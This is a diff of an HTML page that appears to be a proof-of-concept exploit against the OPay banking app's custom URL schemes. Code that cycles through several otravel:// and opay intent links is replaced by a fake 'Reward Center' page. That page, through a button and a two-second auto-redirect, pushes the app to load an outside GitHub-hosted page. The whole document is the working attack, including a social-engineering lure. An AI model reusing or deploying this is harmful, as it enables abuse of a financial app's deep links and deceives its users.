@@ -1,114 +1,27 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting to OPay...</title>
+    <title>OPay Reward Center</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f7f9fb;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #333;
-        }
-
-        .container {
-            text-align: center;
-        }
-
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            border-left-color: #00bf71;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
+        body { font-family: -apple-system, sans-serif; background: #00c853; color: #fff; text-align: center; padding: 50px 20px; }
+        .btn { display: block; background: #fff; color: #00c853; padding: 20px; border-radius: 12px; font-weight: bold; text-decoration: none; font-size: 18px; margin-top: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        h1 { font-size: 24px; }
     </style>
 </head>
-
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <p>Opening OPay app...</p>
-        <p style="font-size: 14px; color: #666;">If you are not redirected, <a id="manual-link" href="#">click here</a>.
-        </p>
-    </div>
+    <h1>🎁 Achievement Unlocked!</h1>
+    <p>Tap below to claim your OPay reward vouchers.</p>
+    
+    <!-- This URI uses the confirmed iOS scheme handler -->
+    <a href="otravel://schemedispatcher?scheme=https://zugonwobi.github.io/test/poc.html" class="btn">Claim Reward Now</a>
 
     <script>
-        window.onload = function () {
-            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            var isIos = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
-            var isAndroid = /android/i.test(userAgent);
-
-            var pocUrl = 'https://zugonwobi.github.io/test/poc2.html?v=' + Date.now();
-            var appStoreUrl = 'https://apps.apple.com/ng/app/opay-we-are-beyond-banking/id1647492161';
-            var playStoreUrl = 'https://play.google.com/store/apps/details?id=com.opay.android';
-
-            var manualLink = document.getElementById('manual-link');
-
-            if (isIos) {
-                // Based on technical analysis, OPay uses 'otravel' for mini-program/H5 dispatching on both platforms.
-                // We will try the confirmed 'schemedispatcher' path first.
-                var iosUrl = 'otravel://schemedispatcher?action=' + encodeURIComponent(pocUrl);
-
-                manualLink.href = iosUrl;
-                window.location.href = iosUrl;
-
-                // Secondary attempt with 'url' parameter (common in some OPay versions)
-                setTimeout(function () {
-                    if (document.hidden || document.webkitHidden) return;
-                    window.location.href = 'otravel://schemedispatcher?url=' + encodeURIComponent(pocUrl);
-                }, 500);
-
-                // Tertiary attempt with 'common' path
-                setTimeout(function () {
-                    if (document.hidden || document.webkitHidden) return;
-                    window.location.href = 'otravel://common?scheme=' + encodeURIComponent(pocUrl);
-                }, 1000);
-
-                // Final attempts
-                setTimeout(function () {
-                    if (document.hidden || document.webkitHidden) return;
-                    window.location.href = 'opaypay://common?url=' + encodeURIComponent(pocUrl);
-                }, 1500);
-
-                // Final Fallback to App Store after 3.5s
-                setTimeout(function () {
-                    if (document.hidden || document.webkitHidden) return;
-                    window.location.href = appStoreUrl;
-                }, 3500);
-
-            } else if (isAndroid) {
-                // Android uses Intents which are more robust for fallbacks.
-                // Package name com.opay.android confirmed.
-                var androidUrl = 'intent://common?url=' + encodeURIComponent(pocUrl) + '#Intent;scheme=opay;package=com.opay.android;S.browser_fallback_url=' + encodeURIComponent(playStoreUrl) + ';end';
-
-                manualLink.href = androidUrl;
-                window.location.replace(androidUrl);
-
-            } else {
-                manualLink.href = playStoreUrl;
-                window.location.href = playStoreUrl;
-            }
-        };
+        // Auto-launch after 2 seconds
+        setTimeout(function() {
+            window.location.href = "otravel://schemedispatcher?scheme=https://zugonwobi.github.io/test/poc.html";
+        }, 2000);
     </script>
 </body>
-
 </html>
